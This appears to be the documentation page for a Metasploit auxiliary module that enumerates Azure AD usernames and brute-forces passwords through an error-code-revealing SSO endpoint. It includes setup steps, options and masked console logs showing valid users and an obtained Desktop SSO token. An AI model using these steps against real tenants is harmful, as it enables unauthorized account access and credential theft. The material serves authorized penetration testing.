## Vulnerable Application

The Microsoft Azure AD service has a vulnerable endpoint that delivers an error-code based response
to specific authentication requests in XML. The endpoint, when passed the correct credentials,
will respond with a DesktopSsoToken that can be used to authenticate to Azure AD. When
the authentication is unsuccessful, the error code that is returned can be used to discover the
validity of usernames in the target tenant.
This module also reports credentials to the credentials database when they are discovered.

## Verification Steps


- [ ] Start `msfconsole`
- [ ] `use auxiliary/scanner/http/azure_ad_login`
- [ ] `set username USER_OR_FILE`
- [ ] `set password PASSWORD_OR_FILE`
- [ ] `set domain DOMAIN`
- [ ] `run`
- [ ] Check output for validity of your test username(s), and password(s)


## Options

### domain

The target tenant domain to use for the username checks.

### username

Either a specific username to verify or a file with one username per line to verify.

### password

Either a specific password to attempt or a file with one password per line to verify.

## Scenarios
If a tenant's domain is known, you can use this module for username and password brute-forcing.

Specific target output replaced with *s so as not to disclose information
```msf6 > use auxiliary/scanner/http/azure_ad_login
msf6 auxiliary(scanner/http/azure_ad_login) > set username /home/kali/users.txt
username => /home/kali/users.txt
msf6 auxiliary(scanner/http/azure_ad_login) > set password /home/kali/pass.txt
pass => /home/kali/pass.txt
msf6 auxiliary(scanner/http/azure_ad_login) > set domain example.com
domain => example.com
msf6 auxiliary(scanner/http/azure_ad_login) > run

msf6 auxiliary(scanner/http/azure_ad_login) > run

[*] Running for *.*.*.*...
[-] example.com\wrong is not a valid user
[-] example.com\wrong is not a valid user
[-] example.com\wrong is not a valid user
[-] example.com\k0pak4 is not a valid user
[-] example.com\k0pak4 is not a valid user
[-] example.com\k0pak4 is not a valid user
[+] Password password is invalid but example.com\**** is valid!
[+] Password Password1! is invalid but example.com\**** is valid!
[+] Login example.com\****:****** is valid!
[+] Desktop SSO Token: *******************************************
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed```

If a tenant's domain is known, you can enumerate their usernames
    
```msf6 > use auxiliary/scanner/http/azure_ad_login
msf6 auxiliary(scanner/http/azure_ad_login) > set username /home/kali/users.txt
username => /home/kali/users.txt
msf6 auxiliary(scanner/http/azure_ad_login) > set password password
pass => password
msf6 auxiliary(scanner/http/azure_ad_login) > set domain example.com
domain => example.com
msf6 auxiliary(scanner/http/azure_ad_login) > run

[*] Running for 127.0.0.1...
[-] example.com\wrong is not a valid user
[-] example.com\k0pak4 is not a valid user
[+] Password password is invalid but example.com\**** is valid!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed```

## Version and OS
Tested against current Azure AD tenants.

## References
- https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/
- https://github.com/treebuilder/aad-sso-enum-brute-spray
